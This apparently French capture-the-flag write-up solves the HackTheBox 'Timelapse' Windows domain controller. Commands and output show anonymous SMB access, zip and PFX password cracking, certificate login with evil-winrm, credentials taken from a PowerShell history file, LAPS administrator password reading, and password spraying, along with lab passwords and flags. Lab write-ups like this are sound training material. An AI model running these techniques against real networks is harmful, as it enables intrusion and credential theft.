Timelapse est une machine Easy Windows, qui implique l'accès à un partage SMB accessible au public et contenant un fichier zip. Ce fichier zip nécessite un mot de passe qui peut être déchiffré à l'aide de John. L'extraction du fichier zip produit un fichier PFX chiffré par mot de passe, qui peut également être déchiffré avec John, en convertissant le fichier PFX dans un format de hachage lisible par John. A partir du fichier PFX, un certificat SSL et une clé privée peuvent être extraits, qui sont utilisés pour se connecter au système via WinRM. Après l'authentification, nous découvrons un fichier historique PowerShell contenant les identifiants de connexion de l'utilisateur `svc_deploy`. L'énumération des utilisateurs montre que `svc_deploy` fait partie d'un groupe nommé `LAPS_Readers`. Le groupe `LAPS_Readers` a la capacité de gérer les mots de passe dans LAPS et tout utilisateur de ce groupe peut lire les mots de passe locaux des machines du domaine. En abusant de cette confiance, nous récupérons le mot de passe de l'administrateur et obtenons une session WinRM.


## Recon

```
─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 20:25 CDT
Initiating Ping Scan at 20:25
Scanning 10.129.227.113 [4 ports]
Completed Ping Scan at 20:25, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. a
Scanning 10.129.227.113 [1000 ports]
Discovered open port 445/tcp on 10.129.227.113
Discovered open port 53/tcp on 10.129.227.113
Discovered open port 139/tcp on 10.129.227.113
Discovered open port 135/tcp on 10.129.227.113
Discovered open port 3269/tcp on 10.129.227.113
Discovered open port 593/tcp on 10.129.227.113
Discovered open port 3268/tcp on 10.129.227.113
SYN Stealth Scan Timing: About 30.17% done; ETC: 20:26 (0:01:12 remaining)
Discovered open port 389/tcp on 10.129.227.113
Discovered open port 88/tcp on 10.129.227.113
Discovered open port 636/tcp on 10.129.227.113
Discovered open port 464/tcp on 10.129.227.113
Completed SYN Stealth Scan at 20:26, 71.34s elapsed (1000 total ports)
Nmap scan report for 10.129.227.113
Host is up (0.28s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 71.79 seconds
           Raw packets sent: 3021 (132.900KB) | Rcvd: 47 (2.052KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269                                                                                                     
----------------------------------------------------------------------------------------------------------                                Completed NSE at 20:32, 3.23s elapsed
Nmap scan report for 10.129.227.113
Host is up (1.6s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-03-12 09:31:49Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
49668/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
54780/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 377.42 seconds
           Raw packets sent: 458856 (20.190MB) | Rcvd: 237 (10.428KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49668,49673,49674,49696,54780                                                             
----------------------------------------------------------------------------------------------------------                                                   
─# nmap -sCV -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49668,49673,49674,49696,54780 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 20:33 CDT
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-12 09:33:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2024-03-12T09:35:31+00:00; +8h00m04s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
54780/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m03s, deviation: 0s, median: 8h00m03s
| smb2-time: 
|   date: 2024-03-12T09:34:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

               

```


- Le domain est : `timelapse.htb` et le DC `DC01.timelapse.htb`
- SMB disponible sur 139 et 445
- MSRPC disponible
- LDAP disponible


```
└─# nxc smb $ip -u '' -p ''                                                                                   
SMB         10.129.227.113  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\: 

```

Un utilisateur anonyme disponible

```
└─# smbclient -N -L //timelapse.htb/                                                    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 

```

je vais voir le `Shares`

```
─# smbclient -N //timelapse.htb/shares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

                6367231 blocks of size 4096. 1259781 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

                6367231 blocks of size 4096. 1253844 blocks available
smb: \Dev\> 
└─# 7z x winrm_backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz (506E3),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Extracting archive: winrm_backup.zip
--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

    
Enter password (will not be echoed):

```

Je dois la cracker

```
└─# john --format=PKZIP winrm.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (?)     
1g 0:00:00:00 DONE (2024-03-11 20:45) 2.777g/s 9648Kp/s 9648Kc/s 9648KC/s suzyreah..superkeeper15
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

je trouve un `legacyy_dev_auth.pfx` alors je vais me logged 

- https://shuciran.github.io/posts/Legacy-PFX-certificate/


```
─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out loggin.pem
Enter Import Password:
Mac verify error: invalid password?


```

On me demande un password je crois que je dois le cracker aussi

```
└─# pfx2john legacyy_dev_auth.pfx > pfx.hash

└─# john --format=pfx pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:30 DONE (2024-03-11 20:55) 0.03333g/s 107724p/s 107724c/s 107724C/s thumper1994..thscoach
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Maintenant je vais extraire la cle privee

```
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private_key.pem -nodes
Enter Import Password:
```

maintenant me connecter avec ssl

```
└─# evil-winrm -i $ip -c loggin.pem -k private_key.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy

*Evil-WinRM* PS C:\Users\legacyy\desktop> type user.txt
8125573b9681f9cc7e6b9bd09c71f923

```


## Lateral Mov

```
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/15/2018  12:19 AM                $Recycle.Bin
d--hs-        3/25/2022   1:17 AM                Config.Msi
d--hsl       10/23/2021  12:27 PM                Documents and Settings
d-----         3/3/2022  10:01 PM                PerfLogs
d-r---        3/25/2022   1:16 AM                Program Files
d-----       10/23/2021  11:27 AM                Program Files (x86)
d--h--        3/25/2022   1:12 AM                ProgramData
d-----       10/25/2021   8:39 AM                Shares
d--hs-       10/23/2021  11:36 AM                System Volume Information
d-r---        2/23/2022   5:45 PM                Users
d-----        3/25/2022   2:00 AM                Windows
-a-hs-        3/12/2024   2:22 AM     1476395008 pagefile.sys


*Evil-WinRM* PS C:\> 
```

un fichier `.msi` interessant mais rien a l'interieur
Je vais utiliser winPeas
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found History Files
File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Windows Files
File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
File: C:\Users\All Users\USOShared\Logs\System
File: C:\Program Files\Common Files\system
File: C:\Program Files (x86)\Common Files\system
File: C:\Users\Default\NTUSER.DAT
File: C:\Users\legacyy\NTUSER.DAT
```

Le fichier 	`ConsoleHost_history` contient un string qui ressemble a un mot de passe et un utilisateur `svc_deploy`

- https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html

```
─# nxc smb $ip -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
SMB         10.129.227.113  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

je vais me connecter au winrm

```
└─# evil-winrm -i $ip -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'  -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy


```

Si ca ne marche pas faut toujours utiliser le `-S` pour ssl

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

Dans ce groupe je trouve que je suis dans le groupe de `LAPS_Readers`

Pour l'exploiter je trouve:

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps

- https://www.hackingarticles.in/credential-dumpinglaps/

```
└─# nxc ldap $ip -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost 10.129.227.113 -M laps
SMB         10.129.227.113  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:qY1S#74!(Y%Y&QLc4,+5++4f

```

or 

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : qY1S#74!(Y%Y&QLc4,+5++4f
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :


```

Maintenant tester ce mot de passe sur tout les users

```
└─# rpcclient -U 'svc_deploy%E3R$Q62^12p7PLlC%KWaxuaV' $ip -c enumdomusers | grep -oP '\[.*?\]' | tr -d [] | grep -v '0x' | tee -a userss
Administrator
Guest
krbtgt
thecybergeek
payl0ad
legacyy
sinfulz
babywyrm
svc_deploy
TRX

─# nxc smb $ip -u userss -p 'qY1S#74!(Y%Y&QLc4,+5++4f' --no-brute --continue-on-success
SMB         10.129.227.113  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\Administrator:qY1S#74!(Y%Y&QLc4,+5++4f (Pwn3d!)
```



Pwned et j'ai maintenant le mot de passe alors je vais me connecter

```
*Evil-WinRM* PS C:\users> cd trx
*Evil-WinRM* PS C:\users\trx> cd desktop
*Evil-WinRM* PS C:\users\trx\desktop> type root.txt
78e6d81d3f8f658b4a008906adf41115
*Evil-WinRM* PS C:\users\trx\desktop> 
```